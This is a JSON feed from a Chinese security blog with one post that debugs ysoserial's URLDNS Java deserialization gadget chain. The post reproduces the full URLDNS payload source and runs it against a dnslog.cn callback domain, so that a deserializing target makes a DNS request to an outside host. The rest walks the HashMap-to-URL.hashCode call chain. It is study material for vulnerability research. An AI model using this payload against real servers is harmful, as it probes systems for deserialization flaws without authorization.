{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"ysoserial调试\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "title": "ysoserial之URLDNS调试",
            "date_published": "2021-08-25T03:38:45.000Z",
            "content_html": "<h1 id=\"利用链简述\"><a class=\"markdownIt-Anchor\" href=\"#利用链简述\">#</a> 利用链简述</h1>\n<ol>\n<li>触发结果为一次 DNS 请求，适用目标无回显情况</li>\n<li>使用 java 内置类构造，无第三方库依赖</li>\n</ol>\n<h1 id=\"urldns利用代码\"><a class=\"markdownIt-Anchor\" href=\"#urldns利用代码\">#</a> URLDNS 利用代码</h1>\n<p>poc：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> ysoserial.payloads;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.InetAddress;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLStreamHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Reflections;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class=\"line\"><span class=\"comment\"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   This was inspired by  Philippe Arteau <span class=\"doctag\">@h</span>3xstream, who wrote a blog</span></span><br><span class=\"line\"><span class=\"comment\"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class=\"line\"><span class=\"comment\"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class=\"line\"><span class=\"comment\"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class=\"line\"><span class=\"comment\"> *   standard JDK classes.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class=\"line\"><span class=\"comment\"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class=\"line\"><span class=\"comment\"> *   during a comparison (either equals or hashCode).</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class=\"line\"><span class=\"comment\"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class=\"line\"><span class=\"comment\"> *   it to trigger a DNS lookup.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   Gadget Chain:</span></span><br><span class=\"line\"><span class=\"comment\"> *     HashMap.readObject()</span></span><br><span class=\"line\"><span class=\"comment\"> *       HashMap.putVal()</span></span><br><span class=\"line\"><span class=\"comment\"> *         HashMap.hash()</span></span><br><span class=\"line\"><span class=\"comment\"> *           URL.hashCode()</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@Dependencies()</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">URLDNS</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">Object</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String url)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//Avoid DNS resolution during payload creation</span></span><br><span class=\"line\">                <span class=\"comment\">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class=\"line\">                URLStreamHandler handler = <span class=\"keyword\">new</span> SilentURLStreamHandler();</span><br><span class=\"line\"></span><br><span class=\"line\">                HashMap ht = <span class=\"keyword\">new</span> HashMap(); <span class=\"comment\">// HashMap that will contain the URL</span></span><br><span class=\"line\">                URL u = <span class=\"keyword\">new</span> URL(<span class=\"keyword\">null</span>, url, handler); <span class=\"comment\">// URL to use as the Key</span></span><br><span class=\"line\">                ht.put(u, url); <span class=\"comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                Reflections.setFieldValue(u, <span class=\"string\">&quot;hashCode&quot;</span>, -<span class=\"number\">1</span>); <span class=\"comment\">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">return</span> ht;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">                PayloadRunner.run(URLDNS.class, args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class=\"line\"><span class=\"comment\">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class=\"line\"><span class=\"comment\">         * using the serialized object.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class=\"line\"><span class=\"comment\">         * second resolution.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SilentURLStreamHandler</span> <span class=\"keyword\">extends</span> <span class=\"title\">URLStreamHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> URLConnection <span class=\"title\">openConnection</span><span class=\"params\">(URL u)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">synchronized</span> InetAddress <span class=\"title\">getHostAddress</span><span class=\"params\">(URL u)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>链接：<a href=\"https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java\">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>\n<h1 id=\"调试分析\"><a class=\"markdownIt-Anchor\" href=\"#调试分析\">#</a> 调试分析</h1>\n<p>项目链接：<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<p>打开 idea，找到 URLDNS 入口：ysosertial-&gt;src-&gt;main-&gt;java-&gt;ysoserial-&gt;payloads-&gt;URLDNS.java-&gt;main ()</p>\n<h2 id=\"运行尝试\"><a class=\"markdownIt-Anchor\" href=\"#运行尝试\">#</a> 运行尝试</h2>\n<p>直接运行 main 函数，发现默认传入的命令为 calc.exe</p>\n<p>报错：URL 初始化失败，找不到 calc.exe 协议</p>\n<p><img src=\"1.png\" alt=\"\"></p>\n<p>最后一行报错信息指向 main 函数，倒数第二行报错信息指向 PayloadRunner</p>\n<p>说明为传入参数 args 有误，应为 URL，也是我们要发送请求的地址</p>\n<p>打开 dnslog，获取到地址为：<a href=\"http://ghtzjz.dnslog.cn\">ghtzjz.dnslog.cn</a></p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>编辑传入参数，<a href=\"http://ghtzjz.dnslog.cn\">http://ghtzjz.dnslog.cn</a></p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<p><img src=\"4.png\" alt=\"\"></p>\n<p>再次运行 main ()，payload 为我们传入的参数</p>\n<p><img src=\"5.png\" alt=\"\"></p>\n<p>刷新 dnslog 的请求记录，发现接收到了请求，利用成功</p>\n<p><img src=\"6.png\" alt=\"\"></p>\n<h2 id=\"代码调试\"><a class=\"markdownIt-Anchor\" href=\"#代码调试\">#</a> 代码调试</h2>\n<p>我们从 main 函数一步一步调试，会发现 URLDNS 在 main 中调用 PayloadRunner#run ()</p>\n<p>然后 PayloadRunner#run () 中调用 URLDNS#getObject ()</p>\n<p>URLDNS#getObject () 中的 HashMap <strong>ht</strong> 就是我们要生成的（未序列化）payload</p>\n<p><img src=\"13.png\" alt=\"\"></p>\n<p>getObeject 方法中，创建了一个 URL 对象（存储我们输入的 dns 地址）–&gt; 再将 URL 对象放入 HashMap 中</p>\n<p>下面一行的注释写道，在上面的 put 过程中，计算并缓存了 URL 的 hashCode; 这将重置它，以便下次调用 hashCode 时将触发 DNS 查找</p>\n<p>那么在 ht.put 时，我们进入 HashMap 查看，发现 key 进行了 hash 计算</p>\n<p>（这里插播一条小道消息，点击这个调试可以返回上一步<img src=\"14.png\" style=\"zoom:90%;\" />)</p>\n<p><img src=\"15.png\" alt=\"\"></p>\n<p>在这里就是我们的 URL 对象进行了 hash 计算</p>\n<p>hash 计算前的 URL 对象：</p>\n<p><img src=\"16.png\" alt=\"\"></p>\n<p>hash 计算后的对象（就是对象中的 hashCode 变量发生了变化嘛）：</p>\n<p><img src=\"19.png\" alt=\"\"></p>\n<p>进入下一行代码，Reflections.setFieldValue 是什么呢？</p>\n<p>看名字就是一个通过反射设置成员变量值的功能😀</p>\n<p>进入函数内部，是要设置传入对象的成员变量 hashCode 的值</p>\n<p><img src=\"17.png\" alt=\"\"></p>\n<p>查看变量值，传入对象是包含 payload 的 URL 对象，要将它的 hashCode 值设置为 - 1</p>\n<p><img src=\"18.png\" alt=\"\"></p>\n<p>执行完这行代码，发现变量 u 和 ht 中存储的 URL 对象的 hashCode 值都变为 - 1 了</p>\n<p><img src=\"20.png\" alt=\"\"></p>\n<p>然后返回 ht，也就是更改过存储 key 的 hashCode 值的 HashMap</p>\n<p>再次进入 PalodRunner#run，返回的 HashMap 赋值给 objBefore，再将其序列化赋值给 ser</p>\n<p><img src=\"21.png\" alt=\"\"></p>\n<p>Utils.releasePayload (payload, objBefore) 应该是释放资源的代码（不用在意，和最后返回值无关）</p>\n<p>最后返回 ser，即将 ser 值赋给变量 serialized，所以 serialized 就是序列化后的 payload</p>\n<p><strong>终于！开始反序列化触发漏洞了！</strong></p>\n<p>从这里进入反序列化函数</p>\n<p><img src=\"22.png\" alt=\"\"></p>\n<p>代码注释中说明，<strong>利用链从 HashMap#readObject () 进入，直到进入 URL#hashCode () 触发 DNS 请求</strong></p>\n<blockquote>\n<p>Gadget Chain:</p>\n<ul>\n<li>\n<pre><code>HashMap.readObject()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.putVal()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.hash()\n</code></pre>\n</li>\n<li>\n<pre><code>URL.hashCode()\n</code></pre>\n</li>\n</ul>\n</blockquote>\n<p>那我们就一直点点点直接看见 readObject</p>\n<p>好了过了没看见嘤嘤嘤</p>\n<p>直接去 Hash#readObject 处下个断点</p>\n<p><img src=\"23.png\" alt=\"\"></p>\n<p>往下翻翻就会看见一段代码，又看见了熟悉的单词，hash</p>\n<p><img src=\"24.png\" alt=\"\"></p>\n<p>根据利用链我们可知触发漏洞的 hashCode () 就在 hash () 中，我们进入该函数</p>\n<p><img src=\"25.png\" alt=\"\"></p>\n<p>到达 URL#hashCode，果然其中有 key.hashCode ()</p>\n<p>因为我们在构造 payload 时将 hashCode 赋值为 - 1，所以不会进入 if 而是执行下面的代码</p>\n<p>调用 URLStreamHandler#hashCode</p>\n<p><img src=\"26.png\" alt=\"\"></p>\n<p>进入 URLStreamHandler#hashCode</p>\n<p>根据 p 神的文章所言，getHostAddress 中有一行代码</p>\n<blockquote>\n<p>InetAddress.getByName(host) ;</p>\n</blockquote>\n<p>其作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询，整个触发过程就已经完成啦</p>\n<p><img src=\"27.png\" alt=\"\"></p>\n<p><img src=\"28.png\" alt=\"\"></p>\n<p>后面继续跟进就是地址的具体查询过程了，无了无了</p>\n<p>下图是漏洞触发的调用栈</p>\n<p><img src=\"29.png\" alt=\"\"></p>\n<h1 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h1>\n<p><strong>payload 构造</strong></p>\n<p>将我们输入的 dns 地址存储在 URL 对象中 -&gt; 将 URL 对象作为 key 存储在 HashMap 中 -&gt; 由于作为 key 值，在 put 时会进行 hash 计算，那我们就通过反射更改其 hashCode 值为 - 1</p>\n<p><strong>漏洞触发</strong></p>\n<p>反序列化 HashMap 时，会调用 hash () 计算 key 的 hash 值 -&gt; 计算时，调用 (URL 对象) key#hashCode () -&gt; 由于我们将该对象的 hashCode 值设置为 - 1，所以会调用 handler.hashCode () -&gt; 其中获取地址的代码， <code> InetAddress addr = getHostAddress(u);</code>  实际上就是一次 DNS 查询</p>\n<p><strong>小彩蛋</strong></p>\n<p>在构造 payload，ht.put () 时，由于 URL 的 hashCode 值为 - 1，所以同样会调用 handler.hashCode () 触发 DNS 查询，可是为什么我们只能获取到一条 dns 查询记录，而不是两条呢？</p>\n<p>直接在 DNS 查询处下断点</p>\n<p>生成 payload 时，进入 URLStreamHandler#hashCode 查看当前变量</p>\n<p><img src=\"31.png\" alt=\"\"></p>\n<p>反序列化时，进入 URLStreamHandler#hashCode 查看当前变量</p>\n<p><img src=\"32.png\" alt=\"\"></p>\n<p>可以发现获取到的 addr 有值了，为 <code>域名/127.0.0.1</code></p>\n<p>那么同样是将 <code>http://ysmzza.dnslog.cn</code>  传入 <code>getHostAddress(u)</code>  得到的结果却不一样呢？</p>\n<p>那么我们再进入 <code>getHostAddress(u)</code>  进行对比</p>\n<p>构造 payload 进入 <code>getHostAddress(u)</code>  时，如下图</p>\n<p><img src=\"33.png\" alt=\"\"></p>\n<p><img src=\"34.png\" alt=\"\"></p>\n<p>这里调用的 SilentURLStreamHandler#getHostAddress 直接返回的 null</p>\n<p>注释:</p>\n<blockquote>\n<p>这个 URLStreamHandler 实例用于在创建 URL 实例时避免任何 DNS 解析。 DNS 解析用于漏洞检测。重要的是不要在使用序列化对象之前探测给定的 URL。潜在的误报：如果首先从测试计算机解析 DNS 名称，则目标服务器可能会获得缓存击中第二个决议。</p>\n</blockquote>\n<p>而在我们反序列化后进入 <code>getHostAddress(u)</code> ，URL 对象中的 handler 就是默认的 handler 了，因而会触发 DNS 查询</p>\n<p>所以 POC 中定义 URLStreamHandler 内部类，避免生成 paayload 时进行 DNS 解析（其实看注释就能看到，但我一开没有看到这里的代码 (๑・́ωก̀๑)  ）</p>\n<p><strong>小问题</strong></p>\n<ol>\n<li>\n<p>漏洞是通过 URLStreamHandler#hashCode 触发的，那么这个 handler 是啥玩意？</p>\n</li>\n<li>\n<p>new URL 对象时，一定要传入 handler 才能触发漏洞吗？如果不传入 handler，程序还能正常运行吗？（因为 HashMap#put 时会调用 URLStreamHandler#hashCode）会有默认的 handler 给我们调用吗？</p>\n</li>\n</ol>\n<p>查查 API</p>\n<blockquote>\n<p>抽象类 <code> URLStreamHandler</code>  是所有流协议处理程序的通用类，流协议处理程序知道如何为特定协议类型建立连接，如 <code>http</code>  或 <code>https</code> 。</p>\n<p>在大多数情况下，  <code>URLStreamHandler</code>  子类的实例不是由应用程序直接创建的。  更确切地说，在第一时间构建时的协议名称遇到 <code>URL</code>  ，适当的流协议处理程序被自动加载。</p>\n</blockquote>\n<p>所以流协议程序用于为协议建立连接，并构建时的协议名称遇见 URL 时，适当的流协议处理程序被自动加载</p>\n<p>所以其实不传入 handler，URL 对象也会自动加载 handler</p>\n<p>由小彩蛋的内容可知传入自定义的 handler 只是为了在生成 payload 时不进行 dns 解析</p>\n<h2 id=\"调试遇到的问题未解决\"><a class=\"markdownIt-Anchor\" href=\"#调试遇到的问题未解决\">#</a> 调试遇到的问题（未解决）</h2>\n<p>在尝试代码调试时，发现无法启用 debug</p>\n<p><img src=\"7.png\" alt=\"\"></p>\n<p>看第一行，运行的是 jdk8_32，而我的 idea 是 64 位的，估计是不一致导致的问题（以前经常碰见 tomcat 和 jdk 不一致导致的问题）</p>\n<p>在上方菜单栏 file-&gt;project structure 中可以设置 jdk 版本，更改为 64 位 jdk</p>\n<p><img src=\"8.png\" alt=\"\"></p>\n<p>然后就会报错，程序包 sun.rmi.server 不存在</p>\n<p><img src=\"9.png\" alt=\"\"></p>\n<p>但是在使用 jdk8 运行程序时并没有该错误，ctrl+click 点击进入报错程序包，是可以找到在 java 原生库中的</p>\n<p><img src=\"10.png\" alt=\"\"></p>\n<p>也就是说在编译程序的 classpath 中没有包含’sun.rmi.server’这个包</p>\n<p>我的直觉告诉我是版本的问题，可是上图中 jdk11 的包里面也有这个包的并且已经引入项目中了</p>\n<p>所以我换回 jdk8_32，查看 jar 包的区别</p>\n<p>jdk8：</p>\n<p><img src=\"11.png\" alt=\"\"></p>\n<p>jdk11:</p>\n<p><img src=\"12.png\" alt=\"\"></p>\n<p>难道这个世界有些东西我真的，难以探寻吗，这真的就是我的极限了吗，不，我要去百度！！百度救我！！！</p>\n<p><strong><a href=\"https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7\">这里发现</a>，jdk11 不再提供 corba 工具，rmic (RMI 编辑器) 不再支持 - idl 或 - iiop 选项。</strong></p>\n<p>可是 java11 的 api 里面是有 rmi 的🙁</p>\n<p>果然换成 jdk8_64 所有问题迎刃而解，那么这个问题…</p>\n<p>当然不能算解决了，未完待续！</p>\n",
            "tags": [
                "ysoserial调试"
            ]
        }
    ]
}